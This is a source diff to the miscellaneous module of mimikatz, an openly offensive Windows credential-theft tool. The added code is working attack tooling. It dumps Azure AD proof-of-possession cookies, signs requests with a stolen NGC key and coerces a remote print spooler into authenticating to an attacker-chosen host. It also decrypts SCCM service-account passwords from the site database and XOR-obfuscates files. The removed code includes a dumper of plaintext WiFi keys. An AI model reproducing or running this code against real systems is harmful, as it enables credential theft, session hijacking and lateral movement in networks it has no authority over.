@@ -1,5 +1,5 @@
 /*	Benjamin DELPY `gentilkiwi`
-	http://blog.gentilkiwi.com
+	https://blog.gentilkiwi.com
 	benjamin@gentilkiwi.com
 	Licence : https://creativecommons.org/licenses/by/4.0/
 */
@@ -10,7 +10,6 @@ const KUHL_M_C kuhl_m_c_misc[] = {
 	{kuhl_m_misc_regedit,	L"regedit",		L"Registry Editor         (without DisableRegistryTools)"},
 	{kuhl_m_misc_taskmgr,	L"taskmgr",		L"Task Manager            (without DisableTaskMgr)"},
 	{kuhl_m_misc_ncroutemon,L"ncroutemon",	L"Juniper Network Connect (without route monitoring)"},
-	{kuhl_m_misc_wifi,		L"wifi",		L"Dump WiFi profile information and key material"},
 #if !defined(_M_ARM64)
 	{kuhl_m_misc_detours,	L"detours",		L"[experimental] Try to enumerate all modules with Detours-like hooks"},
 #endif
@@ -19,80 +18,22 @@ const KUHL_M_C kuhl_m_c_misc[] = {
 //#endif
 	{kuhl_m_misc_memssp,	L"memssp",		NULL},
 	{kuhl_m_misc_skeleton,	L"skeleton",	NULL},
-	{kuhl_m_misc_compressme,L"compressme",	NULL},
+	{kuhl_m_misc_compress,	L"compress",	NULL},
 	{kuhl_m_misc_lock,		L"lock",		NULL},
 	{kuhl_m_misc_wp,		L"wp",			NULL},
 	{kuhl_m_misc_mflt,		L"mflt",		NULL},
 	{kuhl_m_misc_easyntlmchall,	L"easyntlmchall", NULL},
-	{kuhl_m_misc_clip,		L"clip",		 NULL},
+	{kuhl_m_misc_clip,		L"clip",		NULL},
+	{kuhl_m_misc_xor,		L"xor",			NULL},
+	{kuhl_m_misc_aadcookie,	L"aadcookie",	NULL},
+	{kuhl_m_misc_aadcookie_NgcSignWithSymmetricPopKey,	L"ngcsign",	NULL},
+	{kuhl_m_misc_spooler,	L"spooler",		NULL},
+	{kuhl_m_misc_sccm_accounts,	L"sccm",		NULL},
 };
 const KUHL_M kuhl_m_misc = {
 	L"misc",	L"Miscellaneous module",	NULL,
 	ARRAYSIZE(kuhl_m_c_misc), kuhl_m_c_misc, NULL, NULL
 };
-
-HMODULE kuhl_m_misc_hWlanLib = NULL;
-HANDLE kuhl_m_misc_hWlan = NULL;
-
-PWLANOPENHANDLE WlanOpenHandle = NULL;
-PWLANCLOSEHANDLE WlanCloseHandle = NULL;
-PWLANENUMINTERFACES WlanEnumInterfaces = NULL;
-PWLANGETPROFILELIST WlanGetProfileList = NULL;
-PWLANGETPROFILE WlanGetProfile = NULL;
-PWLANFREEMEMORY WlanFreeMemory = NULL;
-
-DWORD kuhl_m_misc_wifi_init()
-{
-	static NTSTATUS status = STATUS_SUCCESS;
-	static BOOL initialised = FALSE;
-
-	if (initialised)
-	{
-		return status;
-	}
-
-	DWORD dwNegoatiatedVersion;
-
-	if(kuhl_m_misc_hWlanLib = LoadLibrary(L"wlanapi"))
-	{
-		WlanOpenHandle = (PWLANOPENHANDLE) GetProcAddress(kuhl_m_misc_hWlanLib, "WlanOpenHandle");
-		WlanCloseHandle = (PWLANCLOSEHANDLE) GetProcAddress(kuhl_m_misc_hWlanLib, "WlanCloseHandle");
-		WlanEnumInterfaces = (PWLANENUMINTERFACES) GetProcAddress(kuhl_m_misc_hWlanLib, "WlanEnumInterfaces");
-		WlanGetProfileList = (PWLANGETPROFILELIST) GetProcAddress(kuhl_m_misc_hWlanLib, "WlanGetProfileList");
-		WlanGetProfile = (PWLANGETPROFILE) GetProcAddress(kuhl_m_misc_hWlanLib, "WlanGetProfile");
-		WlanFreeMemory = (PWLANFREEMEMORY) GetProcAddress(kuhl_m_misc_hWlanLib, "WlanFreeMemory");
-
-
-		if(!(WlanOpenHandle && WlanCloseHandle && WlanEnumInterfaces && WlanGetProfileList && WlanGetProfile && WlanFreeMemory))
-			status = STATUS_NOT_FOUND;
-		else if(WlanOpenHandle((MIMIKATZ_NT_MAJOR_VERSION < 6) ? 1 : 2, NULL, &dwNegoatiatedVersion, &kuhl_m_misc_hWlan) != ERROR_SUCCESS)
-			status = STATUS_INVALID_PARAMETER;
-
-		if(!NT_SUCCESS(status))
-		{
-			FreeLibrary(kuhl_m_misc_hWlanLib);
-			kuhl_m_misc_hWlanLib = NULL;
-		}
-	}
-
-	initialised = TRUE;
-
-	return status;
-}
-
-NTSTATUS kuhl_m_misc_clean()
-{
-	if(kuhl_m_misc_hWlanLib)
-	{
-		if(kuhl_m_misc_hWlan)
-		{
-			WlanCloseHandle(kuhl_m_misc_hWlan, NULL);
-			kuhl_m_misc_hWlan = NULL;
-		}
-		FreeLibrary(kuhl_m_misc_hWlanLib);
-	}
-	return STATUS_SUCCESS;
-}
 
 NTSTATUS kuhl_m_misc_cmd(int argc, wchar_t * argv[])
 {
@@ -805,92 +746,39 @@ NTSTATUS kuhl_m_misc_skeleton(int argc, wchar_t * argv[])
 	return STATUS_SUCCESS;
 }
 
-#define MIMIKATZ_COMPRESSED_FILENAME	MIMIKATZ L"_" MIMIKATZ_ARCH L".compressed"
-NTSTATUS kuhl_m_misc_compressme(int argc, wchar_t * argv[])
+NTSTATUS kuhl_m_misc_compress(int argc, wchar_t * argv[])
 {
-	PBYTE data, compressedData;
-	DWORD size, compressedSize;
+	LPCWSTR szInput, szOutput;
+	PVOID pInput, pOutput;
+	DWORD dwInput, dwOutput;
 #pragma warning(push)
 #pragma warning(disable:4996)
-	wchar_t *fileName = _wpgmptr;
+	if(kull_m_string_args_byName(argc, argv, L"input", &szInput, _wpgmptr))
 #pragma warning(pop)
-	kprintf(L"Using \'%s\' as input file\n", fileName);
-	if(kull_m_file_readData(fileName, &data, &size))
 	{
-		kprintf(L" * Original size  : %u\n", size);
-		if(kull_m_memory_quick_compress(data, size, (PVOID *) &compressedData, &compressedSize))
+		if(kull_m_string_args_byName(argc, argv, L"output", &szOutput, MIMIKATZ L"_" MIMIKATZ_ARCH L".compressed"))
 		{
-			kprintf(L" * Compressed size: %u (%.2f%%)\nUsing \'%s\' as output file... ", compressedSize, 100 * ((float) compressedSize / (float) size), MIMIKATZ_COMPRESSED_FILENAME);
-			if(kull_m_file_writeData(MIMIKATZ_COMPRESSED_FILENAME, compressedData, compressedSize))
-				kprintf(L"OK!\n");
-			else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
-			LocalFree(compressedData);
-		}
-		LocalFree(data);
-	}
-	return STATUS_SUCCESS;
-}
-
-const wchar_t * KUHL_M_MISC_WIFI_STATE[] = {
-	L"Not Ready",
-	L"Connected",
-	L"Ad-Hoc Network Formed",
-	L"Disconnecting",
-	L"Disconnected",
-	L"Associating",
-	L"Discovering",
-	L"Authenticating",
-};
-
-NTSTATUS kuhl_m_misc_wifi_enum()
-{
-	PWLAN_INTERFACE_INFO_LIST pInterfaceList;
-	PWLAN_PROFILE_INFO_LIST pProfileList;
-	LPWSTR pstrProfileXml;
-	DWORD pdwFlags;
-
-	kprintf(L"<wifilist>");
-	if(kuhl_m_misc_hWlan)
-	{
-		if(WlanEnumInterfaces(kuhl_m_misc_hWlan, NULL, &pInterfaceList) == ERROR_SUCCESS)
-		{
-			for(pInterfaceList->dwIndex = 0; pInterfaceList->dwIndex < pInterfaceList->dwNumberOfItems; pInterfaceList->dwIndex++)
+			kprintf(L"Input : %s\nOutput: %s\n\nOpening: ", szInput, szOutput);
+			if(kull_m_file_readData(szInput, (PBYTE *) &pInput, &dwInput))
 			{
-				kprintf(L"<interface><guid>");
-				kull_m_string_displayGUID(&pInterfaceList->InterfaceInfo[pInterfaceList->dwIndex].InterfaceGuid);
-				kprintf(L"</guid><state>%s</state><description>%s</description><profiles>\n", KUHL_M_MISC_WIFI_STATE[pInterfaceList->InterfaceInfo[pInterfaceList->dwIndex].isState], pInterfaceList->InterfaceInfo[pInterfaceList->dwIndex].strInterfaceDescription);
-				if(WlanGetProfileList(kuhl_m_misc_hWlan, &pInterfaceList->InterfaceInfo[pInterfaceList->dwIndex].InterfaceGuid, NULL, &pProfileList) == ERROR_SUCCESS)
+				kprintf(L"OK\n");
+				kprintf(L" * Original size  : %u\n", dwInput);
+				if(kull_m_memory_quick_compress(pInput, dwInput, &pOutput, &dwOutput))
 				{
-					for(pProfileList->dwIndex = 0; pProfileList->dwIndex < pProfileList->dwNumberOfItems; pProfileList->dwIndex++)
-					{
-						//kprintf(L"\t| %s\n", pProfileList->ProfileInfo[pProfileList->dwIndex].strProfileName);
-						pdwFlags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
-						//kprintf(L"%08x\n", pdwFlags);
-						if(WlanGetProfile(kuhl_m_misc_hWlan, &pInterfaceList->InterfaceInfo[pInterfaceList->dwIndex].InterfaceGuid, pProfileList->ProfileInfo[pProfileList->dwIndex].strProfileName, NULL, &pstrProfileXml, &pdwFlags, NULL) == ERROR_SUCCESS)
-						{
-							//kprintf(L"%08x\n", pdwFlags);
-							// Skip the XML header declaration
-							LPWSTR start = pstrProfileXml;
-							while (*(start++) != L'\n');
-							kprintf(L"%s\n", start);
-							WlanFreeMemory(pstrProfileXml);
-						}
-					}
-					WlanFreeMemory(pProfileList);
+					kprintf(L" * Compressed size: %u (%.2f%%)\n", dwOutput, 100 * ((float) dwOutput / (float) dwInput));
+					kprintf(L"Writing: ");
+					if(kull_m_file_writeData(szOutput, pOutput, dwOutput))
+						kprintf(L"OK\n");
+					else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
+					LocalFree(pOutput);
 				}
-				kprintf(L"</profiles></interface>\n");
 			}
-			WlanFreeMemory(pInterfaceList);
+			else PRINT_ERROR_AUTO(L"kull_m_file_readData");
 		}
+		else PRINT_ERROR(L"An /output:file is needed\n");
 	}
-	kprintf(L"</wifilist>\n");
+	else PRINT_ERROR(L"An /input:file is needed\n");
 	return STATUS_SUCCESS;
-}
-
-NTSTATUS kuhl_m_misc_wifi(int argc, wchar_t * argv[])
-{
-	kuhl_m_misc_wifi_init();
-	return kuhl_m_misc_wifi_enum();
 }
 
 NTSTATUS kuhl_m_misc_lock(int argc, wchar_t * argv[])
@@ -1312,4 +1200,338 @@ LRESULT APIENTRY kuhl_m_misc_clip_MainWndProc(HWND hwnd, UINT uMsg, WPARAM wPara
 		result = DefWindowProc(hwnd, uMsg, wParam, lParam);
 	}
 	return result;
+}
+
+NTSTATUS kuhl_m_misc_xor(int argc, wchar_t * argv[])
+{
+	BYTE bXor = 0x42;
+	LPCWSTR szInput, szOutput, szXor;
+	PBYTE data;
+	DWORD dwData, i;
+
+	if(kull_m_string_args_byName(argc, argv, L"input", &szInput, NULL))
+	{
+		if(kull_m_string_args_byName(argc, argv, L"output", &szOutput, NULL))
+		{
+			if(kull_m_string_args_byName(argc, argv, L"xor", &szXor, NULL))
+				bXor = (BYTE) wcstoul(szXor, NULL, 0);
+
+			kprintf(L"Input : %s\nOutput: %s\nXor   : 0x%02x\n\nOpening: ", szInput, szOutput, bXor);
+			if(kull_m_file_readData(szInput, &data, &dwData))
+			{
+				kprintf(L"OK\nWriting: ");
+				for(i = 0; i < dwData; i++)
+					data[i] ^= bXor;
+				if(kull_m_file_writeData(szOutput, data, dwData))
+					kprintf(L"OK\n");
+				else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
+			}
+			else PRINT_ERROR_AUTO(L"kull_m_file_readData");
+		}
+		else PRINT_ERROR(L"An /output:file is needed\n");
+	}
+	else PRINT_ERROR(L"An /input:file is needed\n");
+	return STATUS_SUCCESS;
+}
+
+const CLSID CLSID_ProofOfPossessionCookieInfoManager = {0xa9927f85, 0xa304, 0x4390, {0x8b, 0x23, 0xa7, 0x5f, 0x1c, 0x66, 0x86, 0x00}};
+const IID IID_IProofOfPossessionCookieInfoManager = {0xcdaece56, 0x4edf, 0x43df, {0xb1, 0x13, 0x88, 0xe4, 0x55, 0x6f, 0xa1, 0xbb}};
+NTSTATUS kuhl_m_misc_aadcookie(int argc, wchar_t * argv[])
+{
+	LPCWSTR szURI;
+	IProofOfPossessionCookieInfoManager *pPOPCookieInfoManager = NULL;
+	DWORD cookieInfoCount, i;
+	ProofOfPossessionCookieInfo *cookieInfo;
+	HRESULT hr;
+
+	kull_m_string_args_byName(argc, argv, L"uri", &szURI, L"https://login.microsoftonline.com");
+	hr = CoCreateInstance(&CLSID_ProofOfPossessionCookieInfoManager, NULL, CLSCTX_INPROC_SERVER, &IID_IProofOfPossessionCookieInfoManager, (void **) &pPOPCookieInfoManager);
+	if(hr == S_OK)
+	{
+		kprintf(L"URI: %s\n\n", szURI);
+		hr = IProofOfPossessionCookieInfoManager_GetCookieInfoForUri(pPOPCookieInfoManager, szURI, &cookieInfoCount, &cookieInfo);
+		if(hr == S_OK)
+		{
+			kprintf(L"Cookie count: %2u\n----------------\n", cookieInfoCount);
+			for(i = 0; i < cookieInfoCount; i++)
+			{
+				kprintf(L"\nCookie %u\n", i);
+				kprintf(L"  name     : %s\n", cookieInfo[i].name);
+				kprintf(L"  data     : %s\n", cookieInfo[i].data);
+				kprintf(L"  flags    : 0x%08x (%u)\n", cookieInfo[i].flags, cookieInfo[i].flags);
+				kprintf(L"  p3pHeader: %s\n", cookieInfo[i].p3pHeader);
+
+				CoTaskMemFree(cookieInfo[i].name);      
+				CoTaskMemFree(cookieInfo[i].data);      
+				CoTaskMemFree(cookieInfo[i].p3pHeader); 
+			}
+			CoTaskMemFree(cookieInfo);                  
+		}
+		else PRINT_ERROR(L"GetCookieInfoForUri: 0x%08x\n", hr);
+		IProofOfPossessionCookieInfoManager_Release(pPOPCookieInfoManager);
+	}
+	else PRINT_ERROR(L"CoCreateInstance: 0x%08x\n", hr);
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS kuhl_m_misc_aadcookie_NgcSignWithSymmetricPopKey(int argc, wchar_t * argv[])
+{
+	LPCWSTR szKeyValue, szLabel, szContext, szData;
+	LPSTR sLabel = NULL, sData = NULL, sSignature64;
+	PBYTE pbKeyValue, pbContext = NULL, pbOuput;
+	DWORD cbKeyValue, cbContext, cbOutput;
+
+	if(kull_m_string_args_byName(argc, argv, L"keyvalue", &szKeyValue, NULL))
+	{
+		if(kull_m_string_quick_urlsafe_base64_to_Binary(szKeyValue, &pbKeyValue, &cbKeyValue))
+		{
+			if(cbKeyValue > (2 * sizeof(DWORD)))
+			{
+				kull_m_string_args_byName(argc, argv, L"label", &szLabel, L"AzureAD-SecureConversation");
+				sLabel = kull_m_string_unicode_to_ansi(szLabel);
+				if(kull_m_string_args_byName(argc, argv, L"context", &szContext, NULL))
+					kull_m_string_stringToHexBuffer(szContext, &pbContext, &cbContext);
+				kull_m_string_args_byName(argc, argv, L"signedinfo", &szData, MIMIKATZ);
+				sData = kull_m_string_unicode_to_ansi(szData);
+
+				if(!pbContext)
+				{
+					cbContext = 24;
+					if(pbContext = (PBYTE) LocalAlloc(LPTR, cbContext))
+						CDGenerateRandomBits(pbContext, cbContext);
+				}
+
+				kprintf(L"\nKeyValue : ");
+				kull_m_string_wprintf_hex(pbKeyValue, cbKeyValue, 0);
+				kprintf(L"\nLabel    : %S (ascii)\nContext  : ", sLabel);
+				kull_m_string_wprintf_hex(pbContext, cbContext, 0);
+				kprintf(L"\nData     : %S (ascii)\n", sData);
+
+				if(kull_m_crypto_ngc_signature_pop(pbKeyValue, cbKeyValue, (PBYTE) sLabel, lstrlenA(sLabel), pbContext, cbContext, (PBYTE) sData, lstrlenA(sData), &pbOuput, &cbOutput))
+				{
+					kprintf(L"\nSignature: ");
+					kull_m_string_wprintf_hex(pbOuput, cbOutput, 0);
+					if(kull_m_string_quick_binary_to_urlsafe_base64A(pbOuput, cbOutput, &sSignature64))
+					{
+						kprintf(L" (%S base64)", sSignature64);
+						LocalFree(sSignature64);
+					}
+					kprintf(L"\n");
+					LocalFree(pbOuput);
+				}
+
+				if(sData)
+					LocalFree(sData);
+				if(sLabel)
+					LocalFree(sLabel);
+			}
+			else PRINT_ERROR(L"Invalid KeyValue format?\n");
+			LocalFree(pbKeyValue);
+		}
+	}
+	else PRINT_ERROR(L"/keyvalue:base64 is needed\n");
+
+	return STATUS_SUCCESS;
+}
+
+handle_t hSpoolHandle = NULL;
+handle_t __RPC_USER STRING_HANDLE_bind(IN STRING_HANDLE Name) {return hSpoolHandle;}
+void __RPC_USER STRING_HANDLE_unbind(IN STRING_HANDLE Name, handle_t hSpool) {}
+NTSTATUS kuhl_m_misc_spooler(int argc, wchar_t * argv[])
+{
+	LPCWSTR szRemote, szCallbackTo;
+	LPWSTR szPathToCallback = NULL;
+	PRINTER_HANDLE hPrinter;
+	DEVMODE_CONTAINER Container = {0, NULL};
+	DWORD ret;
+
+	if(kull_m_string_args_byName(argc, argv, L"server", &szRemote, NULL) || kull_m_string_args_byName(argc, argv, L"target", &szRemote, NULL))
+	{
+		if(kull_m_string_args_byName(argc, argv, L"connect", &szCallbackTo, NULL) || kull_m_string_args_byName(argc, argv, L"callback", &szCallbackTo, NULL))
+		{
+			if(kull_m_string_sprintf(&szPathToCallback, L"\\\\%s", szCallbackTo))
+			{
+				kprintf(L"[info] %s will try to connect to %s\\IPC$\n\n", szRemote, szPathToCallback);
+				if(kull_m_rpc_createBinding(NULL, L"ncacn_np", szRemote, L"\\pipe\\spoolss", L"spooler", TRUE, RPC_C_AUTHN_DEFAULT, NULL, RPC_C_IMP_LEVEL_DEFAULT, &hSpoolHandle, NULL))
+				{
+					RpcTryExcept
+					{
+						ret = RpcOpenPrinter(NULL, &hPrinter, NULL, &Container, GENERIC_READ);
+						if(ret == ERROR_SUCCESS)
+						{
+							ret = RpcRemoteFindFirstPrinterChangeNotification(hPrinter, PRINTER_CHANGE_ALL, PRINTER_NOTIFY_CATEGORY_ALL, szPathToCallback, 42, 0, NULL);
+							if(ret == ERROR_SUCCESS)
+							{
+								kprintf(L"Connected to the target, and notification is OK (?!)\n");
+								ret = RpcFindClosePrinterChangeNotification(hPrinter);
+								if(ret != ERROR_SUCCESS)
+								{
+									PRINT_ERROR(L"RpcFindClosePrinterChangeNotification: 0x%08x\n", ret);
+								}
+							}
+							else if(ret == ERROR_ACCESS_DENIED)
+							{
+								kprintf(L"Access is denied (can be OK)\n");
+							}
+							else PRINT_ERROR(L"RpcRemoteFindFirstPrinterChangeNotification: 0x%08x\n", ret);
+
+							ret = RpcClosePrinter(&hPrinter);
+							if(ret != ERROR_SUCCESS)
+							{
+								PRINT_ERROR(L"RpcClosePrinter: 0x%08x\n", ret);
+							}
+						}
+						else PRINT_ERROR(L"RpcOpenPrinter: 0x%08x\n", ret);
+					}
+					RpcExcept(RPC_EXCEPTION)
+						PRINT_ERROR(L"RPC Exception: 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
+					RpcEndExcept
+
+					kull_m_rpc_deleteBinding(&hSpoolHandle);
+				}
+
+				LocalFree(szPathToCallback);
+			}
+		}
+		else PRINT_ERROR(L"missing /connect argument to specify notifications target");
+
+	}
+	else PRINT_ERROR(L"missing /server argument to specify spooler server");
+
+	return STATUS_SUCCESS;
+}
+
+typedef struct _SCCM_ENCRYPTED_HEADER {
+	DWORD cbKey;
+	DWORD cbDecrypted;
+	BYTE data[ANYSIZE_ARRAY];
+} SCCM_ENCRYPTED_HEADER, *PSCCM_ENCRYPTED_HEADER;
+
+const wchar_t SCCM_QUERY[] = L"SELECT SiteNumber, UserName, Password, Availability FROM SC_UserAccount";
+NTSTATUS kuhl_m_misc_sccm_accounts(int argc, wchar_t * argv[])
+{
+	LPCWCHAR szConnectionString, szPrivateKeyContainer;
+
+	SQLHANDLE hEnv, hCon, hSmt;
+	SQLRETURN ret;
+	unsigned long int SiteNumber;
+	char UserName[60], Password[2048];
+	BYTE Availability;
+	SQLLEN szUserName, szPassword;
+
+	PSCCM_ENCRYPTED_HEADER pEncrypted;
+	HCRYPTPROV hProv;
+	HCRYPTKEY hKey;
+	ALG_ID algid;
+	DWORD cbEncrypted, dwKeySetFlags, cbBuffer;
+
+	kull_m_string_args_byName(argc, argv, L"keycontainer", &szPrivateKeyContainer, L"Microsoft Systems Management Server");
+	dwKeySetFlags = kull_m_string_args_byName(argc, argv, L"keyuser", NULL, NULL) ? 0 : CRYPT_MACHINE_KEYSET;
+
+	kprintf(L"[CRYPTO] Private Key Container: %s (%s)\n", szPrivateKeyContainer, (dwKeySetFlags == CRYPT_MACHINE_KEYSET) ? L"machine" : L"user");
+
+	if(kull_m_string_args_byName(argc, argv, L"connectionstring", &szConnectionString, NULL))
+	{
+		kprintf(L"[ SQL  ] ConnectionString: %s\n", szConnectionString);
+
+		SQLAllocHandle(SQL_HANDLE_ENV, SQL_NULL_HANDLE, &hEnv);
+		SQLSetEnvAttr(hEnv, SQL_ATTR_ODBC_VERSION, (SQLPOINTER)SQL_OV_ODBC3, 0);
+		SQLAllocHandle(SQL_HANDLE_DBC, hEnv, &hCon);
+
+		ret = SQLDriverConnect(hCon, NULL, (SQLWCHAR*) szConnectionString, SQL_NTS, NULL, 0, NULL, SQL_DRIVER_NOPROMPT);
+		switch (ret)
+		{
+		case SQL_SUCCESS:
+		case SQL_SUCCESS_WITH_INFO:
+			SQLAllocHandle(SQL_HANDLE_STMT, hCon, &hSmt);
+
+			kprintf(L"[ SQL  ] Query to accounts: %s\n", SCCM_QUERY);
+			ret = SQLExecDirect(hSmt, (SQLWCHAR *) SCCM_QUERY, SQL_NTS);
+			if (ret == SQL_SUCCESS)
+			{
+				/* To avoid a lots of them */
+				kprintf(L"[CRYPTO] Acquiring local SCCM RSA Private Key\n");
+				if (CryptAcquireContext(&hProv, szPrivateKeyContainer, NULL, PROV_RSA_AES, dwKeySetFlags | CRYPT_SILENT))
+				{
+					/**/
+					kprintf(L"\n");
+					while (SQLFetch(hSmt) == SQL_SUCCESS)
+					{
+						ret = SQLGetData(hSmt, 1, SQL_C_ULONG, &SiteNumber, sizeof(SiteNumber), NULL);
+						if (ret == SQL_SUCCESS)
+						{
+							ret = SQLGetData(hSmt, 2, SQL_C_CHAR, UserName, sizeof(UserName), &szUserName);
+							if (ret == SQL_SUCCESS)
+							{
+								ret = SQLGetData(hSmt, 3, SQL_C_CHAR, Password, sizeof(Password), &szPassword);
+								if (ret == SQL_SUCCESS)
+								{
+									ret = SQLGetData(hSmt, 4, SQL_C_TINYINT, &Availability, sizeof(Availability), NULL);
+									if (ret == SQL_SUCCESS)
+									{
+										kprintf(L"[%u-%hhu] %.*S - ", SiteNumber, Availability, szUserName, UserName);
+										if (kull_m_crypto_StringToBinaryA(Password, (DWORD)szPassword, CRYPT_STRING_HEX, (PBYTE*)&pEncrypted, &cbEncrypted))
+										{
+											if (!Availability)
+											{
+												if (CryptImportKey(hProv, pEncrypted->data, pEncrypted->cbKey, 0, 0, &hKey))
+												{
+													cbBuffer = sizeof(ALG_ID);
+													if (CryptGetKeyParam(hKey, KP_ALGID, (BYTE*)&algid, &cbBuffer, 0))
+													{
+														kprintf(L"[%s] ", kull_m_crypto_algid_to_name(algid));
+													}
+
+													cbBuffer = cbEncrypted - FIELD_OFFSET(SCCM_ENCRYPTED_HEADER, data) - pEncrypted->cbKey;
+													if (CryptDecrypt(hKey, 0, TRUE, 0, pEncrypted->data + pEncrypted->cbKey, &cbBuffer))
+													{
+														if (cbBuffer == pEncrypted->cbDecrypted)
+														{
+															kprintf(L"%.*S\n", cbBuffer, pEncrypted->data + pEncrypted->cbKey);
+														}
+														else PRINT_ERROR(L"cbBuffer != cbDecrypted");
+													}
+													else PRINT_ERROR_AUTO(L"CryptDecrypt");
+
+													CryptDestroyKey(hKey);
+												}
+												else PRINT_ERROR_AUTO(L"CryptImportKey");
+											}
+											else kprintf(L"{todo if needed} \n"); // SELECT Name, Value1, Value2 FROM SC_SiteDefinition_Property WHERE Name LIKE 'GlobalAccount:%' (AES256 decrypt)
+
+											LocalFree(pEncrypted);
+										}
+									}
+									else PRINT_ERROR(L"SQLGetData(Availability): %u (0x%08x)\n", ret, ret);
+								}
+								else PRINT_ERROR(L"SQLGetData(Password): %u (0x%08x)\n", ret, ret);
+							}
+							else PRINT_ERROR(L"SQLGetData(UserName): %u (0x%08x)\n", ret, ret);
+						}
+						else PRINT_ERROR(L"SQLGetData(SiteNumber): %u (0x%08x)\n", ret, ret);
+					}
+					kprintf(L"\n");
+					/**/
+					kprintf(L"[CRYPTO] Releasing local SCCM RSA Private Key\n");
+					CryptReleaseContext(hProv, 0);
+				}
+				else PRINT_ERROR_AUTO(L"CryptAcquireContext");
+				/* No more crypto */
+			}
+			else PRINT_ERROR(L"SQLExecDirect: %u (0x%08x)\n", ret, ret);
+			SQLFreeHandle(SQL_HANDLE_STMT, hSmt);
+
+			break;
+
+		default:
+			PRINT_ERROR(L"SQLDriverConnect: %u (0x%08x)\n", ret, ret);
+		}
+
+		SQLDisconnect(hCon);
+		SQLFreeHandle(SQL_HANDLE_DBC, hCon);
+		SQLFreeHandle(SQL_HANDLE_ENV, hEnv);
+	}
+	else PRINT_ERROR(L"/connectionstring is needed, example: /connectionstring:\"DRIVER={SQL Server};Trusted=true;DATABASE=CM_PRD;SERVER=myserver.fqdn\\instancename;\"\n");
+
+	return STATUS_SUCCESS;
 }
